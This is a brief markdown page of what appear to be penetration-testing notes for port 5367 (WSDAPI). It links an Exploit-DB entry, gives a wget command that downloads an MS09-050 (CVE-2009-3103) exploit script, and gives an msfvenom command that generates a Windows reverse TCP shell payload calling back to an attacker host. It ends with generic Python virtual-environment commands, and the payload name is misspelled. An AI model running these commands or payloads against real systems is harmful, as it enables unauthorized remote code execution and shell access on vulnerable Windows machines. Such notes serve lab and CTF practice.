---
title: 5367 - WSDAPI
layout: default
---

[exploit-db.com/exploits/40280](https://www.exploit-db.com/exploits/40280)

```bash
wget https://raw.githubusercontent.com/sec13b/ms09-050_CVE-2009-3103/refs/heads/main/MS09_050_2.py
```

```bash
msfvenom -p windows/shell_revese_tcp LHOST=<LHOST> LPORT=443 EXITFUNC=thread -f python -v shell
```

```
mkdir <dir_name>1  
cd <dir_name>  
python3 -m venv <env_name> - creating a virtual environment  
source <env_name>/bin/activate - activate the environment  
deactivate - deactivate virtual environment
```